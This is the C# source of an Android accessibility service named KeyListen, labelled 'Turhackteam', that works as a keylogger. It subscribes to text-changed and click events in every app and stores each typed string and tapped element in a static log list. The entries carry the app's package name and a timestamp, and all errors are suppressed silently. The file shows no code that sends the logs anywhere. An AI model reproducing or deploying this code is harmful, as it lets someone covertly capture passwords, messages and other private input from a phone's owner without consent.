using System;
using System.Collections.Generic;
using Android;
using Android.AccessibilityServices;
using Android.App;
using Android.Content;
using Android.Views.Accessibility;

namespace izci
{
    [Service(Label = "Turhackteam", Permission = Manifest.Permission.BindAccessibilityService)]
    [IntentFilter(new[] { "android.accessibilityservice.AccessibilityService" })]
    public class KeyListen : AccessibilityService
    {
        public static List<string> loglar = new List<string>();
        protected override void OnServiceConnected()
        {
            try
            {
                var accessibilityServiceInfo = ServiceInfo;

                accessibilityServiceInfo.EventTypes |= EventTypes.ViewTextChanged;
                accessibilityServiceInfo.EventTypes |= EventTypes.ViewClicked;

                accessibilityServiceInfo.Flags |= AccessibilityServiceFlags.IncludeNotImportantViews;
                accessibilityServiceInfo.Flags |= AccessibilityServiceFlags.RequestFilterKeyEvents;
                accessibilityServiceInfo.Flags |= AccessibilityServiceFlags.ReportViewIds;
                accessibilityServiceInfo.Flags |= AccessibilityServiceFlags.RequestTouchExplorationMode;
                accessibilityServiceInfo.FeedbackType = FeedbackFlags.AllMask;
                accessibilityServiceInfo.NotificationTimeout = 1;

                SetServiceInfo(accessibilityServiceInfo);
            }
            catch (Exception) { }
            base.OnServiceConnected();
        }
        string tempus = "";
        private string paketIsmi(AccessibilityEvent ivent)
        {
            if(ivent.PackageName != tempus)
            {
                tempus = ivent.PackageName;
                return "[" + DateTime.Now.ToString("HH:mm") + "] "+ivent.PackageName + Environment.NewLine;                
            }
            return "";
        }
        string temp2 = "";
        private string paketIsmi_(AccessibilityEvent ivent)
        {
            if (ivent.PackageName != temp2)
            {
                temp2 = ivent.PackageName;
                return "[Tıklandı][" + DateTime.Now.ToString("HH:mm") + "] " + ivent.PackageName + " ";
            }
            return "[Tıklandı] ";
        }
        public override void OnAccessibilityEvent(AccessibilityEvent e)
        {
            switch (e.EventType) {

                case  EventTypes.ViewTextChanged:           
                try
                {
                    loglar.Add(paketIsmi(e) + e.Text[0]);
                    //Toast.MakeText(ApplicationContext, e.PackageName + " " + e.Text[0].ToString(), ToastLength.Long).Show();
                }
                catch (Exception) {
                     //Toast.MakeText(ApplicationContext, ex.Message, ToastLength.Long).Show(); 
                    }
                    break;
             case EventTypes.ViewClicked:
            
                try
                {
                        loglar.Add(paketIsmi_(e) + e.Text[0]);
                        //Toast.MakeText(ApplicationContext, e.PackageName +" TIKLANDI: "+ e.Text[0].ToString(), ToastLength.Long).Show();
                }
                catch (Exception) {                        
                    //Toast.MakeText(ApplicationContext, ex.Message + " Click", ToastLength.Long).Show(); 
                    }
            break;
        }
        }
        

        public override void OnInterrupt()
        {

        }
    }
}